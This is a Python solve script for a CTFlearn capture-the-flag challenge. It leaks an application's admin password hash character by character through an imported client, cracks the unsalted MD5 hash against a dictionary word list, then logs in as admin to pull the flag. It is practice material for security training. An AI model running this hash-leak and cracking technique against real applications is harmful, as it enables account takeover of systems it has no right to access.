#!/usr/bin/env python3

import hashlib
import re
from client import AppClient

def update_progress(msg=''):
  print('\x1b[1K\r', msg, sep='', end='', flush=True)


def get_hash_pool(source='/usr/share/dict/words'):
  md5 = lambda data: hashlib.md5(data.encode()).hexdigest()
  with open(source) as file:
    return {md5(line.strip()): line.strip() for line in file}


def get_admin_password(eager_mode=True):
  update_progress('Computing hashes...')
  hashes = get_hash_pool()

  app = AppClient(logger=update_progress)
  app.login()
  admin_hash = ''

  for digit in app.get_admin_password_hash():
    admin_hash += digit

    if eager_mode:
      hashes = {k: v for k, v in hashes.items() if k.startswith(admin_hash)}
      if len(hashes) == 1:
        password = [*hashes.values()][0]
        update_progress(f'Admin password: {password}')
        return password

  if admin_hash in hashes:
    password = hashes[admin_hash]
    update_progress(f'Admin password: {password}')
    return password

  assert False


def get_flag(username, password):
  app = AppClient(logger=update_progress)
  response = app.login(username, password)

  update_progress()

  if result := re.search('ctflearn{(.*?)}', response, re.IGNORECASE):
    return result.group(1)

  assert False


def main():
  flag = get_flag('admin', get_admin_password())
  print('CTFlearn{%s}' % flag)


if __name__ == '__main__':
  main()
